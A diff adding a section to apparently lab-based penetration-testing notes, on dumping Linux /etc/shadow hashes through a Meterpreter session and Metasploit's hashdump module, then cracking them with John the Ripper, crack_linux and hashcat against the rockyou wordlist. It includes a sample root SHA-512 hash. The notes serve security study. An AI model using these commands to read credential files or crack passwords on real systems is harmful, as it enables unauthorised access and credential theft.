@@ -702,4 +702,48 @@ hashcat -m 1000 -a 3 hashes.txt /usr/share/wordlists/rockyou.txt
 cat .hashcat/hashcat.potfile
 ```
 
+### Dumping and Cracking Linux Hashes
+- Need privileges to access `/etc/shadow`
+	- $1 - MD5 (weakest)
+	- $2 - Blowfish
+	- $5 - SHA-256
+	- $6 - SHA-512
+
+```
+meterpreter > cat /etc/shadow
+root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:18348:0:99999:7:::
+```
+- Unable to use `hashdump` for Linux?
+
+#### John the Ripper
+```
+use post/linux/gather/hashdump
+set SESSION <session_id>
+
+creds
+loot
+
+cat /root/.msf4/loot/20240104035021_default_192.122.73.3_linux.hashes_884293.txt
+root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
+
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+john --format=sha512crypt /root/.msf4/loot/20240104035021_default_192.122.73.3_linux.hashes_884293.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+cat .john/john.pot
+```
+- Must use the unshadowed password file.
+
+```
+use auxiliary/analyze/crack_linux
+set SHA512 true
+```
+
+#### Hashcat
+```
+hashcat -m 1800 -a 3 /root/.msf4/loot/20240104035021_default_192.122.73.3_linux.hashes_884293.txt /usr/share/wordlists/rockyou.txt
+
+cat .hashcat/hashcat.potfile
+```
+
 ## Social Engineering
